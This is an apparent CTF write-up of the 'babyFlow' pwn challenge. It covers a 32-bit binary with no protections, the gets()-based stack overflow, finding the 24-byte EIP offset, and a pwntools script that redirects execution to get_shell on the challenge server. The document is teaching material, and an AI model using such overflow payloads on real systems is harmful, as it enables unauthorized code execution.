# ictf.ninja -  babyFlow

*Category : Binary Exploitation*

Challenge called babyFlow that was done in this writeup

Let start by analyze binary with File command

![](https://blackninja23.github.io/assets/img/ctf/ictf.ninja/pwn/babyFlow/babyFlow.png)


From above, File Command give us three descriptions in which
- The file is running under architecture of 32 bit
- The word dynamically linked meaning that some functions are loaded from my pc
- The word not stripped meaning that binary functions' name are preserved

Let check security of binary and i can see that it is basically doesnot have any security that i need to worry about it
```
➜  pwn checksec babyFlow
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/blackninja23/Documents/ctf/ninjactf/pwn/babyFlow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```


Open binary with ghidra, i can see that function get is used

![](https://blackninja23.github.io/assets/img/ctf/ictf.ninja/pwn/babyFlow/gets.png)

Use manual page of linux, `man gets`,i can see that it is vulnerable to buffer overflow

![](https://blackninja23.github.io/assets/img/ctf/ictf.ninja/pwn/babyFlow/getsvuln.png)

Verify by sending more 'A's to the inputs and i got segmentation fault in which it is meaning to be overflow of buffer

Analyze more in ghidra, i can see that i have function called get_shell in which it gives shell

![](https://blackninja23.github.io/assets/img/ctf/ictf.ninja/pwn/babyFlow/getshell.png)

With Logic that i have is that i need to overflow butter to the instruction pointer and give instruction pointer that address of get_shell so as to get shell

But first i need to find offset in which i would fill before affect instruction pointer.

With this, I will use cyclic command to generate random characters with different value after 4 bytes

Second, I will use pwndbg to run my binary then send those value of size 100

*Command*
```
gdb ./babyFlow
```
After send those value, i can see that EIP take value of 'gaaa'(0x61616167)
![](https://blackninja23.github.io/assets/img/ctf/ictf.ninja/pwn/babyFlow/EIP.png)

Use cyclic command, we can get offset of value 24

![](https://blackninja23.github.io/assets/img/ctf/ictf.ninja/pwn/babyFlow/EIPo.png)

First I would check if i can overwrite after 24 bytes sent and so we generate random value of 'A','B','C'

```
➜  pwn python3 -c 'print("A"*24+"B"*4)'
AAAAAAAAAAAAAAAAAAAAAAAABBBB
```

By checking, i can see that i can overwrite its value of 'B'

![](https://blackninja23.github.io/assets/img/ctf/ictf.ninja/pwn/babyFlow/EIPOverwrite.png)

i need to send address of get_shell instead of value of 'B'

At this point, i will write python script in which i would send random 24 bytes and its address after 24 bytes and i will got shell on server but keep in mind, i already test it on binary
```
from pwn import *
add = ELF('./babyFlow')
#e = process('./babyFlow')
host = "143.198.219.171"
port = 5000
e = remote(host,port)
offset = 24
payload = b'A'* offset
payload +=p32(add.symbols['get_shell'])
print(add.symbols['get_shell'])
print(payload)
print(e.recvuntil(b'\n'))

e.sendline(payload)

e.interactive()
```

I got flag
